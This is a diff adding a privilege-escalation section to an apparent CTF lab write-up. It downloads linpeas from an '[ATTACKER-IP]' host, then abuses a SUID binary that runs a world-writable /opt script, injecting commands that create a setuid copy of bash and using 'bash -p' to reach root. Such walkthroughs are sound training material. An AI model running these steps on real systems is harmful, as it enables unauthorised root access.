@@ -128,3 +128,270 @@ Let's find other flaws to the system.
 
 ## ROOT Access
 According to the room "exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation." This will serve as a clue.
+
+First let's upload linpeas for system enumeration. The **/tmp** directory for unusual reason is unwritable. Strange. Let's find other writable directory.
+```
+$ find / -type d -user think -writable 2>/dev/null
+/proc/1572/task/1572/fd
+/proc/1572/fd
+/proc/1572/map_files
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/pulseaudio.service
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.socket
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
+/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/dbus.service
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/pulseaudio.service
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.socket
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
+/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/dbus.service
+/home/think
+/home/think/.gnupg
+/home/think/.gnupg/private-keys-v1.d
+/home/think/.cache
+/home/think/.local
+/home/think/.local/share
+/home/think/.local/share/nano
+/home/think/.ssh
+/home/think/.config
+/home/think/.config/pulse
+/run/user/1000                            // SEEMS INTERESTING
+/run/user/1000/dbus-1
+/run/user/1000/dbus-1/services
+/run/user/1000/pulse
+/run/user/1000/gnupg
+/run/user/1000/systemd
+/run/user/1000/systemd/units
+```
+
+Let's use the **/run/user/1000** directory.
+
+### Linpeas System Enumeration
+
+> Attacker Machine
+```
+$ python3 -m http.server 80
+```
+
+> Target Machine
+```
+$ cd /
+$ cd /run/user/1000
+$ wget http://[ATTACKER-IP]/linpeas.sh
+```
+
+Run linpeas:
+```
+$ chmod 700 linpeas.sh
+$ ./linpeas.sh
+```
+
+### Privilege Escalation
+
+There are many results to be exploited from the enumeration. But we will exploit the strange **/opt** directory.
+
+> Suspicious Linpeas Result 
+```
+Unexpected in /opt (usually empty)
+...
+-rwxrwxrwx 1 root root 1715 Jan 10 12:40 run_container.sh
+```
+
+Let's head to **/opt** directory
+```
+$ cd /
+$ cd /opt
+$ find / -perm /4000 2>/dev/null
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/sbin/pppd
+/usr/sbin/run_container
+/usr/bin/at
+/usr/bin/fusermount
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/sudo
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/mount
+/usr/bin/su
+/usr/bin/newgrp
+/usr/bin/pkexec
+/usr/bin/umount
+```
+
+When it is run:
+```
+$ /usr/sbin/run_container
+List of Docker containers:
+ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 44 minutes
+
+Enter the ID of the container or leave blank to create a new one: 
+```
+
+Let
+```
+$strings /usr/sbin/run_container
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+__stack_chk_fail
+execve
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+GLIBC_2.4
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+/bin/bash
+/opt/run_container.sh                                   // INTERESTING !!!!!!!!
+:*3$"
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.8061
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+run_container.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+_edata
+__stack_chk_fail@@GLIBC_2.4
+__libc_start_main@@GLIBC_2.2.5
+execve@@GLIBC_2.2.5
+__data_start
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.gnu.property
+.note.gnu.build-id
+.note.ABI-tag
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.plt.sec
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+```
+
+Then copy **/bin/bash** into **/run/user/1000**.
+
+```
+~$ cp /bin/bash /run/user/1000
+~$ ls -la /run/user/1000
+bash  bus  dbus-1  gnupg  inaccessible  pk-debconf-socket  pulse  systemd
+```
+
+Run bash from the **/run/user/1000**
+```
+~$ cd /run/user/1000
+$ ./bash
+```
+
+Go to the **/opt** directory:
+```
+$ cd /opt
+$ nano run_container.sh
+```
+
+Add the following bash command in the nano editor:
+```
+cp /bin/bash /tmp/bash
+chmod +s /tmp/bash
+```
+
+Run **run_container** and just ignore the error:
+```
+$ run_container
+List of Docker containers:
+ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 10 minutes
+
+Enter the ID of the container or leave blank to create a new one: 
+/opt/run_container.sh: line 33: validate_container_id: command not found
+
+OPTIONS:
+1) Start Container
+2) Stop Container
+3) Restart Container
+4) Create Container
+5) Quit
+Choose an action for a container: 1 
+Error response from daemon: page not found
+Error: failed to start containers: 
+```
+
+After running **run_container**, the command we incremented for the **/tmp** directory:
+```
+$ ls /tmp
+bash                                                                              // HIGHLIGHTED IN RED
+systemd-private-5d29a60d4f2948edbcb0571ceb1b7347-ModemManager.service-eS1Knf
+systemd-private-5d29a60d4f2948edbcb0571ceb1b7347-systemd-logind.service-2S0XJf
+systemd-private-5d29a60d4f2948edbcb0571ceb1b7347-systemd-resolved.service-BB8yUf
+systemd-private-5d29a60d4f2948edbcb0571ceb1b7347-systemd-timesyncd.service-ISTWeh
+$ ls -l /tmp/bash
+-rwsr-sr-x 1 root root 1183448 Aug 10 03:13 /tmp/bash                            // HIGHLIGHTED IN RED
+```
+
+Let's now run **/tmp/bash**:
+```
+$ /tmp/bash
+bash-5.0$ whoami
+think
+bash-5.0$ pwd
+/opt
+bash-5.0$ cat /root/root.txt
+cat: /root/root.txt: Permission denied
+bash-5.0$ exit
+exit
+```
+
+We are still **Think** user, we will add **-p** with the command:
+```
+$ /tmp/bash -p
+bash-5.0# whoami
+root
+bash-5.0# cat /root/root.txt
+[RETRIEVE FLAG]
+```
+
+
+
+
+
